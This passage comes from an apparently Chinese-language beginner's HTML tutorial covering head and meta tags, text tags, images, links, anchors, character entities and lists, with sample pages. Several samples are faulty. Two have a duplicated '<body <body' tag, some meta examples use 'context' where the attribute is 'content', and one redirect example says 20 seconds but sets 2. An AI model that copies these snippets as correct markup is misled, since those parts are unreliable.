&lt;style&gt;。\n头部中最常用的标记符是标题标记符&lt;title&gt;页面标题&lt;/title&gt;和&lt;meta&gt;标记符，其中标题标记符用于定义网页的标题，它的内容显示在网页窗口的标题栏中，网页标题可被浏览器用作书签和收藏清单。\n设置文档标题和其它在网页中不显示的信息，比如direction方向、语言代码Language Code（实体定义!ENTITY % i18n）、指定字典中的元信息、等等。\n\n\n&lt;body&gt;&lt;/body&gt;：是网页主要内容的显示区域。网页中显示的实际内容均包含在这2个正文标记符之间。正文标记符又称为实体标记。网页中99%的内容都必须放在&lt;body&gt;。只有放在&lt;body&gt;中，最终浏览器翻译以后，才能看见结果。\n\n\n\n二、关于头部&lt;head&gt;&lt;/head&gt;中常用的两个标签&lt;title&gt;&lt;/title&gt;和&lt;meta&gt;：\n\n\n&lt;title&gt;纯文本&lt;/title&gt;中只能是纯文本，任何标记都会原封不动的显示。\n\n&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;功能：告诉浏览器，如何翻译汉字。\n\nhttp-equiv：模拟http协议的文件头原信息，主要目的是服务器向客户端返回时，用什么格式显示。\nContent-type：内容类型。\nContent：详细内容类型介绍。\nText/html：网页是text格式，html是文本中的小格式。\nCharset：字符集，主要控制汉字如何显示。\nUtf-8：多国语言编码，什么国家的语言都可以正常显示。\n\n\n\n\n\n1.2 HTML文件组成\nHTML 是什么\n\nHTML 是用来描述网页的一种语言。\nHTML 不是一种编程语言，而是一种标记语言\n标记语言是一套标记标签 (markup tag)\nHTML 使用标记标签来描述网页\nHTML 文档包含了HTML 标签及文本内容\nHTML文档也叫做 web 页面\n\n\n\n\nHTML 标签\n\nHTML 标记标签通常被称为 HTML 标签 (HTML tag)。\nHTML 标签是由尖括号包围的关键词，比如 &lt;html&gt;\nHTML 标签通常是成对出现的，比如 &lt;b&gt; 和 &lt;/b&gt;。也有单边标签，只有开始标签，而没结束标签，单边标签一般是没有内容。如：&lt;br&gt;\n标签对中的第一个标签是开始标签，第二个标签是结束标签\n开始和结束标签也被称为开放标签和闭合标签\n标签语法格式：\n双边标签：&lt;标签 属性1 = “值1”  属性2 = “值2”&gt;内容&lt;/标签&gt;\n单边标签：&lt;标签 属性1 = “值1”  属性2 = “值2”&gt;\n\n\n\n\n\n\nHTML 元素\n\n“HTML 标签” 和 “HTML 元素” 通常都是描述同样的意思.\n但是严格来讲, 一个 HTML 元素包含了开始标签与结束标签，如下实例:\nHTML 元素:&lt;p&gt;这是一个段落。&lt;/p&gt;\n\n\n\n\n\nHTML元素是组成HTML文档最基本的部件，它是用标签来表现的，一般来说，“起始标签”表示元素的开始，“结束标签”表示元素的结束。\n\nHTML元素分为“有内容的元素”和“空元素”两种。\n\n“有内容的元素”是由起始标签、结束标签以及两者之间的元素内容组成的，其中元素内容既可以是需要显示在网页中的文字内容，也可以是其它元素。\n\n\n\n\n\n\nHTML 元素属性\n\nHTML 标签可以拥有属性。属性提供了有关 HTML 元素的更多的信息。\n属性总是以名称/值对的形式出现，比如：name=&quot;value&quot;。\n属性值应该始终被包括在引号内。双引号是最常用的，不过使用单引号也没有问题。\n\n\n\n\n\nHTML的元素属性提供了对HTML元素的描述和控制信息，借助于元素属性，HTML网页才会展现丰富多彩且格式美观的内容。\n例如要设置&lt;p&gt;元素中文字内容的颜色为红色，字号为30像素，这时就需要用到HTML元素属性了。如在&lt;p&gt;元素名称的尖括号内添加了style=&quot;color:#ff0000;font-size:30px&quot;内容，浏览器就会按照设定的效果来显示内容。\n\n\n\n\n\n\n\n二. HTML 标签\n2.1 标签介绍按功能排序HTML的标签请参考：《HTML 标签参考手册- (HTML5 标准)》 \nHTML标签分两类：双边标签和单边标签。\n\n1. 双边标签\n\n双边标签，是指有开始和结束标签，内容放在开始和结束标签之间。如：&lt;b&gt;内容&lt;/b&gt;\n\n\n“属性”的通俗理解：一个东西总是有一些特征，重量，体积等，这就是一个东西的“属性”\n\n语法格式：&lt;标签 属性1 = “值1”  属性2 = “值2”&gt;内容&lt;/标签&gt;\n\n\n\n2. 单边标签\n\n单边标签，只有开始标签，而没结束标签，单边标签一般是没有内容。如：&lt;br&gt;\n\n单边标签一般起一个特殊的功能。\n\n单边标签常用的有10多个标记。\n\n语法格式：&lt;标签 属性1 = “值1”  属性2 = “值2”&gt;\n\n\n\n先来看一下双边标签例子，观察&lt;font&gt;&lt;/font&gt;标签\n&lt;!DOCTYPE HTML>\n&lt;html>\n    &lt;head>\n        &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n        &lt;title>directoree.top&lt;/title>\n    &lt;/head>\n    &lt;body &lt;body background=\"https://i.loli.net/2019/03/08/5c82461ac1553.png\">>\n        &lt;h1>第一个，哈哈哈哈&lt;/h1>\n       &lt;font size=\"6\" color=\"red\">看看我有什么特别的&lt;/font>&lt;/font>\n    &lt;/body>\n&lt;/html>\n\n运行如下图：\n\n\n再来看一下单边标签例子，观察&lt;br&gt;标签\n&lt;!DOCTYPE HTML>\n&lt;html>\n    &lt;head>\n        &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n        &lt;title>treecatee.github.io&lt;/title>\n    &lt;/head>\n    &lt;body &lt;body background=\"https://i.loli.net/2019/03/08/5c82461ac1553.png\">>\n        &lt;h1>第二个，哈哈哈哈&lt;/h1>\n        &lt;br>&lt;br>&lt;br>\n       &lt;font size=\"6\" color=\"red\">再看看我有什么特别的&lt;/font>\n       &lt;br>&lt;br>&lt;br>\n       &lt;font size=\"6\" color=\"red\">再看看我有什么特别的&lt;/font>\n    &lt;/body>\n&lt;/html>\n\n运行如下图：\n\n\nHTML标签编写规范\nHTML标记不区分大小写。如：&lt;font&gt;、&lt;Font&gt;、&lt;fOnt&gt;。单特殊符号必须小写，如&amp;nbsp。\nHTML标记属性可有可无。有的标记是没有属性的，如：&lt;html&gt;、&lt;head&gt;、&lt;title&gt;等\n双边标记的内容在开始和结束标签之间，单边标记没有内容。\nHTML标记可以相互嵌套，但一定注意是顺序嵌套，外层套内层，一层套一层，不能交叉嵌套。\n\n\n\n\n\n\n\n2.2 常用标签-文本\n &lt;!DOCTYPE HTML&gt; html5标准网页声明（必须有）\n &lt;html&gt;&lt;/html&gt; 声明代码格式（必须有）\n &lt;head&gt;&lt;/head&gt; 文件头（必须有）\n &lt;title&gt;&lt;/title&gt; 标题（必须有）\n &lt;meta&gt; 元数据  …..\n\n\n &lt;body&gt;&lt;/body&gt;&emsp;&lt;h1&gt; - &lt;h6&gt;（必须有）\n 文本标签\n &lt;b&gt;&lt;/b&gt; 加粗\n &lt;i&gt;&lt;/i&gt; 斜体\n &lt;u&gt;&lt;/u&gt; 下划线\n &lt;s&gt;&lt;/s&gt; 删除线\n &lt;sup&gt;&lt;/sup&gt; 上标\n &lt;sub&gt;&lt;/sub&gt; 下标\n &lt;font&gt;&lt;/font&gt; 字体标记\n size 大小(1 -&gt; 7)\n color 颜色\n face 字体\n\n\n\n\n &lt;p&gt;&lt;/p&gt; 表示一个段落\n &lt;br&gt; 换行 \n &lt;hr&gt; 段落分割线 \n &lt;pre&gt;&lt;/pre&gt; &lt;code&gt;&lt;/code&gt; 定义预格式化的文本和格式代码块\n &lt;strong&gt;和&lt;em&gt; 加粗和斜体（强调）\n &lt;span&gt;&lt;/span&gt; 对文档中的行内元素进行组合\n\n\n1. &lt;head&gt;&lt;/head&gt;头标签\n\n\n&lt;head&gt;内的元素可包含脚本，指示浏览器在何处可以找到样式表，提供元信息等。可添加到head部分的标签：&lt;title&gt;、&lt;base&gt;、&lt;meta&gt;、&lt;link&gt;、&lt;script&gt;、&lt;style&gt;:\n\n&lt;title&gt;：指定整个网页的标题，在浏览器最上方显示。\n&lt;base&gt;：为页面上的所有链接规定默认地址或默认目标(target)。\n&lt;meta&gt;：提供有关页面的基本信息。\n&lt;script&gt;：定义客户端脚本，如JavaScript。\n&lt;style&gt;：定义内部样式表与网页的关系。\n\n\n\n\n&lt;title&gt;&lt;/title&gt;：标签定义文档的标题。 \n\ntitle 元素在所有 HTML/XHTML 文档中都是必需的，无属性；\n&lt;title&gt;纯文本&lt;/title&gt;中间只能是纯文本；\ntitle 元素能够：\n定义浏览器工具栏中的标题\n提供页面被添加到收藏夹时显示的标题\n显示在搜索引擎结果中的页面标题\n告诉用户和搜索引擎这个网页的主要内容是什么，\n搜索引擎可以通过网页标题，迅速的判断出当前网页的主题。\n\n\n\n\n\n\n\n\n\n\n&lt;meta&gt;：标签 \n&lt;meta&gt; 标签提供关于 HTML 文档的元数据。\n元数据不会显示在页面上，但是对于机器是可读的。\n典型的情况是，meta 元素被用于规定页面的描述、关键词、文档的作者、最后修改时间以及其他元数据。\n&lt;meta&gt; 标签始终只能位于 head 元素中。但是头部可以有多个&lt;meta&gt; 标签。\n元数据可用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他 web 服务。\n包含属性：（有属性就必须有对应的值(content)）\ncontent：必须属性。\n定义与 http-equiv 或 name 属性相关的元信息，content中的内容其实就是各个参数的变量值。\n变量值可以有多个，用半角逗号,隔开。\n\n\nhttp-equiv：可选属性。可选值：\ncontent-type，内容类别，用于设置页面的类别和语言字符集。编写格式&lt;meta http-equiv=“content-type” context=“text/html”；charset=“gb2312”/&gt;，content属性的值代表页面采用HTML代码输出，字符集为gb2312（简体中文），国际化网站开发的话，为了字符统一，建议charset采用utf-8.\nrefresh。刷新，用于设置多长时间内网页自己刷新一次，或者用一段时间自动跳转到其他页面，第一种编写格式&lt;meta http-equiv=“refresh” context=“30”/&gt;表示隔30秒刷新一次，第二种编写格式&lt;meta http-equiv=“refresh” context=“30；url=www.google.com”/&gt;，表示30秒后页面自动跳转到www.google.com网站\n\n\nname：可选属性。\n用于页面的关键字和描述，是写给搜索引擎看的；\n与之对应的属性值为content，content中的内容主要是便于搜索引擎机器人查找信息和分类信息用的。\n主要用于描述网页的内容，用于对搜索引擎的优化，必须重点掌握。正确地设置name属性，以便搜索引擎（比如google，baidu）的搜索机器人查找，分类，搜索引擎一般都会自动查找meta值来给网页分类。name的取值(content)如下：\nkeywords。即关键字，用于说明网页所包含的关键字等信息，从而提高被搜索引擎搜索到的概率。编写格式为&lt;meta name=&quot;keywords&quot; content =“关键字”/&gt;，content属性的值为用户所设置的具体关键字。（一般可设置多个关键字，他们之间用英文半角的逗号分开，搜索引擎都限制关键字的数量，所以关键字内容要简洁精练）\ndescription。中文意思为”描述”，用于描述网页的主要内容、主题等，合理设置也可以提高被搜索引擎搜索到的概率。格式为&lt;meta name=&quot;description&quot; content =“对页面的描述”/&gt;，content属性值为用户所设置的页面具体描述的内容，最多容纳1024个字符，但搜索引擎一边只显示约前175个字符。\nauthor。作者，用于设置网站作者的名称，比较专业的网站经常用到。格式为&lt;meta name=&quot;author&quot; content =“作者名称”/&gt;\n\n\n\n\n\n\n\n\n\n可参读：《HTML &lt;head&gt; 元素》 、《HTML-head头部浅析》 \n\n例1：打开该网页后每隔20秒刷新一次\n&lt;!DOCTYPE HTML>\n&lt;html>\n    &lt;head>\n        &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n        &lt;meta http-equiv=\"refresh\" content=\"20\">\n    &lt;/head>\n    &lt;body>\n        &lt;h1>这是个展示网页hhh&lt;/h1>\n        &lt;h2>希望你能够在这里学的开心&lt;/h2>\n    &lt;/body>\n&lt;/html>\n\n\n例2：打开该网页20秒后跳转到百度首页\n&lt;!DOCTYPE HTML>\n&lt;html>\n    &lt;head>\n        &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n        &lt;meta http-equiv=\"refresh\" content=\"2;url=http://www.baidu.com\">\n    &lt;/head>                  '注意这里的2后是分号“;” '\n    &lt;body>\n        &lt;h1>跳转网页hhh&lt;/h1>\n        &lt;h2>希望你能够在这里学的开心&lt;/h2>\n    &lt;/body>\n&lt;/html>\n\n\n\n\n\n&lt;base&gt;：标签  \n&lt;base&gt; 标签为页面上的所有链接设置默认的地址或默认的目标（target）\n\n\n\n\n&lt;link&gt;：标签  \n&lt;link&gt; 标签定义文档与外部资源之间的关系。\n\n\n\n\n&lt;style&gt;：标签  \n&lt;style&gt; 标签用于为 HTML 文档定义样式信息。\n\n\n\n\n&lt;script&gt;&lt;/script&gt;：标签 \n&lt;script&gt; 标签用于定义客户端脚本，比如JavaScript。\n\n\n\n2. &lt;body&gt;标签和标题\n\nHTML 标题（Heading）是通过&lt;h1&gt; - &lt;h6&gt;标签来定义的。\nbody用法如下：\n\n\n\n用法\n作用\n可选属性/是否赞成使用该属性\n\n\n\n\n&lt;body&gt;内容&lt;/body&gt;\n定义文档的主体\nalink：规定文档中活动链接（active link）的的颜色&emsp;&emsp;&emsp;不赞成使用。请使用样式取代它。background URL：规定文档的背景图。&emsp;&emsp;&emsp;不赞成使用。请使用样式取代它。bgcolor：规定文档的背景颜色&emsp;&emsp;&emsp;不赞成使用。请使用样式取代它。link：规定文档中未访问链接的默认颜色&emsp;&emsp;&emsp;不赞成使用。请使用样式取代它。text：规定文档中所有文本的颜色&emsp;&emsp;&emsp;不赞成使用。请使用样式取代它。vlink：规定文档中已被访问链接的颜色&emsp;&emsp;&emsp;不赞成使用。请使用样式取代它。\n\n\n\n&lt;body&gt;的常用属性\nbgColor：网页背景色。如：&lt;body  bgColor = “red”&gt;\nbackground：网页背景图片地址。如：&lt;body  background = “images/01.jpg”&gt;\n\n示例：\n&lt;!DOCTYPE HTML>\n&lt;html>\n    &lt;head>\n        &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n        &lt;title>demook.hhh&lt;/title>\n    &lt;/head>\n    &lt;body background=\"https://i.loli.net/2019/03/08/5c82461ac1593.png\">\n        &lt;h1>Nice优秀啊....&lt;/h1>\n       &lt;h2>是的呢 ヾ(๑╹◡╹)ﾉ\" &lt;/h2>\n    &lt;/body>\n&lt;/html>\n\n运行结果：\n\n\n\n3. 文本修饰标签\n\n\n\n\n\n用法\n作用\n\n\n\n\n&lt;b&gt;&lt;/b&gt;\n加粗字体。如：&lt;b&gt;HTML文件&lt;/b&gt; ----&gt; HTML文件\n\n\n&lt;i&gt;&lt;/i&gt;\n斜体italic。如：&lt;i&gt;HTML文本&lt;/i&gt;----&gt; HTML文本\n\n\n&lt;u&gt;&lt;/u&gt;\n下划线underline。如：&lt;u&gt;HTML文本&lt;/u&gt;----&gt; HTML文本\n\n\n&lt;s&gt;&lt;/s&gt;\n删除线strike。如：&lt;s&gt;删除线&lt;/s&gt;----&gt; 删除线\n\n\n&lt;sup&gt;&lt;/sup&gt;\n上标，如：3&lt;sup&gt;x&lt;/sup&gt; ----&gt; 3x\n\n\n&lt;sub&gt;&lt;/sub&gt;\n下标，如：6&lt;sub&gt;5&lt;/sub&gt; ----&gt; 65\n\n\n&lt;font&gt;&lt;/font&gt;\n字体标记，如：&lt;font size=&quot;4&quot; color=&quot;red&quot; face=&quot;Comic sans MS&quot;&gt;Demo&lt;/font&gt;Demo\n\n\nsize\n&lt;font&gt;&lt;font&gt;的属性。文本大小，取值1-7（1小，7大）\n\n\ncolor\n&lt;font&gt;&lt;font&gt;的属性。颜色值\n\n\nface\n&lt;font&gt;&lt;font&gt;的属性。字体，楷体、黑体、宋体\n\n\n\n\n\n4. &lt;p&gt;&lt;/p&gt;表示一个段落\n\n属性及取值如下：\n\n\n\n属性\n值\n描述\n\n\n\n\nalign\nleftrightcenterjustify\nHTML5不支持。 HTML 4.01已废弃。 不赞成使用。请使用样式取代它。 规定段落中文\n\n\n\n\n\n5. &lt;br&gt; 标签\n\n&lt;br&gt; 标签插入一个简单的换行符。&lt;br&gt; 标签是一个空标签，意味着它没有结束\n提示：在写地址信息或者写诗词时 &lt;br&gt; 标签非常有用。\n注释： 请使用 &lt;br&gt; 标签来输入空行，而不是分割段落。\n在 HTML 中，&lt;br&gt; 标签没有结束标签。\n在 XHTML 中，&lt;br&gt; 标签必须被正确地关闭，比如这样：&lt;br /&gt; 。\n\n\n6. &lt;hr&gt; 标签\n\n\n\n\n7. &lt;pre&gt;&lt;/pre&gt; &lt;code&gt;&lt;/code&gt;\n\n&lt;pre&gt;预排版标记\n功能：将保留所有的空白字符(空格、换行符)，换句话说：就是原封不动输出。可参读：《html &lt;.code&gt;&amp;&lt;.pre&gt;》 \n\n\n8. &lt;strong&gt;和 &lt;em&gt;\n\n\n有了段落又有了标题，现在如果想在一段话中特别强调某几个文字，这时候就可以用到&lt;em&gt;或&lt;strong&gt;标签。\n\n但两者在强调的语气上有区别:&lt;em&gt; 表示强调，&lt;strong&gt;表示更强烈的强调。并且在浏览器中&lt;em&gt; 默认用斜体表示，&lt;strong&gt; 用粗体表示。两个标签相比，目前国内前端程序员更喜欢使用&lt;strong&gt;表示强调。\n\n&lt;em&gt;的内容在浏览中显示为斜体，&lt;strong&gt;显示为加粗。如果不喜欢这种样式，没有关系，以后可以使用css样式去改变它。\n\n\n\n\n9. &lt;span&gt;&lt;/span&gt;&gt;\n\n\n&lt;span&gt; 标签被用来组合文档中的行内元素。span 没有固定的格式表现。当对它应用样式时，它才会产生视觉上的变化。如果不对 &lt;span&gt; 应用样式，那么 &lt;span&gt; 元素中的文本与其他文本不会任何视觉上的差异。\n\n&lt;span&gt; 标签提供了一种将文本的一部分或者文档的一部分独立出来的方式。\n\n被 &lt;span&gt; 元素包含的文本，您可以使用 CSS 对它定义样式，或者使用 JavaScript 对它进行操作。\n\n\n\n\n2.3 常用标签-链接和图像一. image图像注：这是一个单边标签\n\n\n\n &lt;img&gt; 单边标签，它只包含属性，并且没有闭合标签。\n 必须属性 ↓↓\n src：地址。src 指 “source”。源属性的值是图像的 URL 地址。语法：&lt;img src=&quot;url&quot; alt=&quot;some_text&quot;&gt;\n alt：图像替代文本，在浏览器无法载入图像时，浏览器将显示这个替代性的文本而不是图像。语法：&lt;img src=&quot;../style/images/boat.gif&quot; alt=&quot;Big Boat&quot;&gt;\n\n\n 可选属性 ↓↓\n height：图像高度，默认单位为像素\n width ：图像宽度，默认单位为像素\n ismap ：为图像定义为服务器端图像映射\n\n\n\n\n\n\n注：可以尝试输入其他属性看看效果，想要让图片居中，只能通过CSS。\n示例：\n&lt;!DOCTYPE HTML>\n&lt;html>\n &lt;head>\n &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n &lt;/head>\n &lt;body>\n &lt;p>Life was like a box of chocolates, you never know what you're gonna get.（生命就像一盒巧克力，结果往往出人意料。）---《阿甘正传》 \n &lt;/p>\n &lt;img src=\"https://s2.ax1x.com/2019/03/04/kOxQJS.jpg\" width=\"200\">\n &lt;/body>\n&lt;/html>\n\n\n\n二. 超级链接请注意超级链接和锚点链接是不一样滴……\n网站中随处可见超级链接的身影，打开百度新闻，任意点击一段话，就会打开新闻详情页，这全部都是超级链接\n语法格式：&lt;a  属性 = “值”&gt;……&lt;/a&gt;注：&lt;a&gt;中不能再套&lt;a&gt;标记\n\n1. 标签 \n\n\n\n\n &lt;a&gt;&lt;/a&gt; 超级链接，中间是文本提示，常用属性:\n href：目标文件的地址URL（该URL可以是相对地址，也可以是绝对地址）\n target：目标文件的显示窗口的方法：\n _blank：在新窗口中打开目标文件。\n _self：在当前窗口中打开目标文件(默认打开)，相当于“替换”当前页面操作。\n _parent：在父级窗口来打开目标文件。常用框架网页中\n _top：在最顶级窗口来打开目标文件。常用框架网页中\n\n\n\n\n\n\n2. 绝对地址URL \n\n\n（1）远程的绝对地址：直接输入远程绝对路径\n\n访问远程的文件，总是以&lt;a href=&quot;http://域名/主机名..&quot;&gt;提示文本&lt;/a&gt;如：&lt;a href=&quot;https://Treecatee.github.io&quot; target=&quot;_blank&quot;&gt;Treecatee.github.io&lt;/a&gt;\n\n\n（2）本地的绝对地址(很少使用)：访问本地绝对的路径文件\n\n访问本地的绝对地址，是以&lt;a href=&quot;http://file:///开头的绝对地址。&quot;&gt;file:///开头的绝对地址。&lt;/a&gt;如：&lt;a href=&quot;file:///D:/image.html&quot; target=&quot;_blank&quot;&gt;\n\n示例：\n&lt;!DOCTYPE HTML>\n&lt;html>\n &lt;head>\n &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n &lt;/head>\n &lt;body>\n     &lt;a href=\"https://treecatee.github.io\"  target=\"_blank\">远程绝对路径访问，哈哈哈😁&lt;/a> \n      &lt;br>&lt;br>\n  &lt;a href=\"file:///D:/image.html\" target=\"_blank\">(。・∀・)ノ本地绝对路径访问，不要忘记“/ / /”&lt;/a> \n &lt;/body>\n&lt;/html>\n\n\n3. 相对地址URL（项目中路径一般是相对路径） \n\n（1）当前文件和目标文件是同级关系，链接地址直接写目标文件名。\n（2）当前文件与目标文件所在的文件夹是同级关系，先找“文件夹名”，然后再找“文件名”。\n（3）目标文件位于上一层目录中，往上找对应的目录，再找目录中的文件。\n\n注意：\n./代表当前目录，默认使用\n../代表上一级目录\n../../代表上两级目录\n\n\n\n\n示例：\n&lt;!DOCTYPE HTML>\n&lt;html>\n &lt;head>\n &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n &lt;/head>\n &lt;body>\n    &lt;br>&lt;br>&lt;br>&lt;br>\n     &lt;a href=\"./tina.html\"  target=\"_blank\">同级目录下的本地相对路径链接，哈哈哈😁&lt;/a> \n      &lt;br>&lt;br>\n   &lt;a href=\"../test/2.html\" target=\"_blank\">上级目录下的本地相对路径链接 (。・∀・)ノ&lt;/a> \n   &lt;a href=\"../../dream/hap.mp3\" target=\"_blank\">上上级目录下的本地相对路径链接 ♪(´▽｀)&lt;/a> \n &lt;/body>\n&lt;/html>\n\n\n4. 特殊的链接 \n\n(1) 下载链接\n\n这些文件网页可以直接执行，如：.jpg、.png、.gif、.html、.htm、.txt等。\n\n大部分文件，浏览器是不能直接执行的。如：.doc、.xls、.ppt、.rar、.psd……\n\n\n(2) 邮箱链接\n(3) 普通空链接（#）如：&lt;a href=&quot;#&quot;&gt;这是一个空链接&lt;/a&gt;\n\n三. 锚点链接&lt;a id=&quot;锚点名称&quot;&gt;&lt;/a&gt; ：定义锚点，做个记号&lt;a href=&quot;[文件名]#锚点名称&quot;&gt;提示文本（必须有）&lt;/a&gt; ：记号，功能是跳到做记号的地方\n分为当前页面跳转和跨页面跳转，页内跳转时不用文件名，跨页跳转时用。\n\n\n\n锚点是什么？\n为什么要用锚点？\n锚点怎么用？\n\n\n\n\n锚点是什么？\n\n如我们在做一个很长的网页时，需要在页面内做一个导航，点击导航里的链接不是新开一个窗口或者跳转到其他网址，而是跳转到当前页的某一个位置。那么所要跳转到的那个位置，我们就叫做锚点，它是一种在页面内部定位的方式。\n\n为什么要用锚点？\n\n在写项目的时候，页面比较长，这时候需要设置锚点进行快速定位到某个段落或某个位置。\n\n锚点怎么用？\n\n分为当前页面跳转或者跨页面跳转：\n\n 定义锚点(作个记号)：用于定位的目的地。不管是当前当前页面内还是跨页跳转定义方法都一样；\n 定义方法：&lt;a id=&quot;锚点名称&quot;&gt;&lt;/a&gt;或&lt;h2 id=&quot;锚点名称&quot;&gt;&lt;/h2&gt;或…..\n 锚点名称命名规则：\n 可以包含字母、数字、下划线，但只能以字母开头。\n\n\n\n\n 锚点（触发），也称为记号。\n 跳到当前页面定义方法：&lt;a  href=&quot;#锚点名称&quot;&gt;提示文本（必须有）&lt;/a&gt;\n 跨页面跳转定义方法：&lt;a  href=&quot;目标页面路径#锚点名称&quot;&gt;提示文本（必须有）&lt;/a&gt;\n\n\n id或name：定义锚点链接的名称。\n name是老方法，id是在name基础上发明的，后来才有的。\n 使用name属性设置锚点很方便但只能针对a标签来使用，具有一定的局限性。而对div等其他没有name属性的标签就不能起到作用了。\n id兼容性很好。\n\n\n\n\n示例（页内跳转）：\n&lt;!DOCTYPE HTML>\n&lt;html>\n &lt;head>\n &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n &lt;/head>\n &lt;body> \n      &lt;a id=\"top\">&lt;/a>\n            &lt;!--设置锚点，索引功能-->\n      &lt;a href=\"#a\">点击我就会跳到第一段&lt;/a>  \n      &lt;a href=\"#b\">点击我就会跳到第二段&lt;/a>\n      &lt;a href=\"#c\">点击我就会跳到第三段&lt;/a>\n                   .\n                   .\n                   .\n                   .\n              &lt;!--做记号-->\n      &lt;h2 id=\"a\">我是标题一&lt;/h2>\n      &lt;h2 id=\"b\">我是标题二&lt;/h2>\n      &lt;h2 id=\"c\">我是标题三&lt;/h2>\n  　　\n      &lt;a href=\"#top\">返回新闻顶部&lt;/a>\n　　\n  &lt;/body>\n&lt;/html>                 \n\n\n示例（跨内跳转）：\n&lt;!DOCTYPE HTML>\n&lt;html>\n &lt;head>\n &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n &lt;/head>\n &lt;body> \n                &lt;!--设置锚点，索引功能,然后在目的页面做好记号-->\n       &lt;a href=\"https://treecatee.github.io#a\">点击我就会跳到第一段&lt;/a>  \n       &lt;a href=\"https://directoree.top#b\">点击我就会跳到第二段&lt;/a>\n       &lt;a href=\"https://taobao.com#c\">点击我就会跳到第三段&lt;/a>　　\n  &lt;/body>\n&lt;/html>                 \n\n\n\n2.4 HTML字符实体\nHTML 中的预留字符必须被替换为字符实体。\n\n\n1. HTML 实体\n\n\n在 HTML 中，某些字符是预留的。\n\n在 HTML 中不能使用小于号（&lt;）和大于号（&gt;），这是因为浏览器会误认为它们是标签。\n\n如果希望正确地显示预留字符，我们必须在 HTML 源代码中使用字符实体（character entities）。\n\n注：记得加上半角分号;符号啊，不然识别不出来\n\n\n\n\n如需显示小于号，我们必须这样写：&amp;lt; 或 &amp;#60;提示：使用实体名而不是数字的好处是，名称易于记忆。不过坏处是，浏览器也许并不支持所有实体名称（对实体数字的支持却很好）。\n\n\n2. 不间断空格（non-breaking space）\n\n\nHTML 中的常用字符实体是不间断空格(&amp;nbsp;)。\n\n浏览器总是会截短 HTML 页面中的空格。如果您在文本中写 10 个空格，在显示该页面之前，浏览器会删除它们中的 9 个，因此，要使用10个空格的话就需要写10个&amp;nbsp; 。（如需在页面中增加空格的数量，您需要使用 &amp;nbsp; 字符实体）\n\n\n\n3. HTML 中有用的字符实体\n\n注释：实体名称对大小写敏感！半角分号不要忘记！如果想要输出&amp;nbsp;而不被转义为空格，可这样：&amp;amp;nbsp;，因为&amp;amp;对应$-->&amp;nbsp;\n\n\n\n显示结果\n描述\n实体名称\n实体编号\n\n\n\n\n\n空格\n&amp;nbsp;\n&amp;#160;\n\n\n&lt;\n小于号\n&amp;lt;\n&amp;#60;\n\n\n>\n大于号\n&amp;gt;\n&amp;#62; \n\n\n&amp;\n和号\n&amp;amp;\n&amp;#38;\n\n\n“\n引号\n&amp;quot;\n&amp;#34;\n\n\n‘\n撇号\n&amp;apos;(IE不支持)\n&amp;#39;\n\n\n￠\n分（cent）\n&amp;cent;\n&amp;#162;\n\n\n£\n镑（pound）\n&amp;pound;\n&amp;#163;\n\n\n¥\n元（yen）\n&amp;yen;\n&amp;#165;\n\n\n€\n欧元（euro）\n&amp;euro;\n&amp;#8364;\n\n\n§\n小节\n&amp;sect;\n&amp;#167;\n\n\n©\n版权（copyright）\n&amp;copy;\n&amp;#169;\n\n\n®\n注册商标\n&amp;reg;\n&amp;#174;\n\n\n™\n商标\n&amp;trade;\n&amp;#8482;\n\n\n×\n乘号\n&amp;times;\n&amp;#215;\n\n\n÷\n除号\n&amp;divide;\n&amp;#247;\n\n\n\n完整的实体符号参考：[HTML ISO-8859-1 参考手册] \n\n\n三. HTML 列表列表就是像word里面的标题一样，顺着往下数的标题。\nHTML 支持无序列表ul(unordered list）、有序列表ol（ordered list）和自定义列表dl（definition list）\n\n\n &lt;ul&gt;&lt;/ul&gt; 无序列表\n &lt;li&gt;&lt;/li&gt; 列表项\n type 列表项属性，放在&lt;ul type=””&gt;里，取值有：\n disc 小黑点\n circle 空心圆\n square 实心方块\n\n\n\n\n &lt;ol&gt;&lt;/ol&gt; 有序列表\n &lt;li&gt;&lt;/li&gt; 列表项\n type 编号类型，放在&lt;ol type=””&gt;里，取值有：\n 1 整数有序列表\n a 字母小写有序列表\n A 字母大写有序列表\n i 罗马小写有序列表\n I 罗马大写有序列表\n\n\n start 从第几个开始编号(数字)，放在&lt;dl type=”” start=””&gt;里。\n\n\n &lt;dl&gt;&lt;/dl&gt; 自定义列表\n &lt;dt&gt;&lt;/dt&gt; 自定义列表项\n &lt;dd&gt;&lt;/dd&gt; 自定义列表项的描述\n\n\n\n\n\n\n列表展示如下：\n&lt;!DOCTYPE HTML>\n&lt;html>\n    &lt;head>\n        &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n    &lt;/head>\n&lt;body background=\"https://i.loli.net/2019/03/09/5c8320e82a362.jpg\">\n  &lt;ol type=\"1\" start=\"1\">          &lt;!--有序列表开始-->\n    &lt;li>哈哈，这里是第一条有序列表&lt;/li>\n\n     &lt;ul type=\"circle\">            &lt;!--无序列表开始-->\n          &lt;li>这里是第一条无序列表&lt;/li>   \n          &lt;li>这里是第二条无序列表&lt;/li>\n     &lt;/ul>                         &lt;!--无序列表结束-->\n\n     &lt;ul type=\"disc\">\n          &lt;li>这里是第三条无序列表&lt;/li>   \n          &lt;li>这里是第四条无序列表&lt;/li>\n     &lt;/ul>\n  &lt;br>  \n  &lt;li>哈哈，这里是第二条有序列表&lt;/li>\n\n     &lt;ul type=\"square\">\n          &lt;li>这里是第五条无序列表&lt;/li>   \n          &lt;li>这里是第六条无序列表&lt;/li>\n     &lt;/ul>  \n  &lt;/ol>                             &lt;!--有序列表结束-->\n\n  &lt;ol type=\"a\" start=\"a\">\n     &lt;li>哈哈，这里是第三条有序列表&lt;/li>\n   &lt;br>\n     